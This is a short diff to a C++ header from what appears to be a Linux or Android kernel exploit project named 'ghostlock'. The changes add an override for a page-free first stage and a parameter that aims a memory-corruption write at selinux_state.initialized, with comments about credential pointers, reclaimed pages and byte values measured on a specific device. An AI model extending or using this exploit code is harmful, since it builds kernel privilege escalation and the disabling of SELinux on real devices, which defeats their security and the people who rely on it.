@@ -182,11 +182,14 @@ namespace ghostlock::memory {
 } // namespace ghostlock::memory
 
 namespace ghostlock::memory {
-    /* Resolve the request-dependent words shared by the three route encoders. */
+    /* Resolve the request-dependent words shared by the three route encoders.
+     * `zero_value_override` replaces the page-derived W1 value when non-zero:
+     * page-free Stage 1 passes `data_alias(scratch) + 0x100` -- the same +0x100
+     * construction, from a kernel region instead of the reclaimed page. */
     PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
-        uintptr_t init_cred_alias);
+        uintptr_t init_cred_alias, uintptr_t zero_value_override = 0);
 
     /* Encode the route-neutral compact waiter write arm. Value writes always use
  * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
@@ -197,8 +200,13 @@ namespace ghostlock::memory {
     int32_t payload_write_layout_matches_request(
         const WriteRequest *request, const PayloadWriteLayout *layout);
 
+    /* `initialized_offset` is the byte of the stored value that lands on
+     * `selinux_state.initialized` (2 below 6.6, 1 from 6.6). The kernel's
+     * compiled check is a bit-0 test on that byte (`ldarb; tbnz #0`), so the
+     * byte must be odd -- measured on the diting, run 20261029-235007. */
     int32_t payload_write_layout_accepts_page(
-        const WriteRequest *request, const PayloadWriteLayout *layout);
+        const WriteRequest *request, const PayloadWriteLayout *layout,
+        uint32_t initialized_offset);
 
     void build_multicast_waiter_payload(
         unsigned char *buffer, size_t waiter_offset, size_t task_offset,
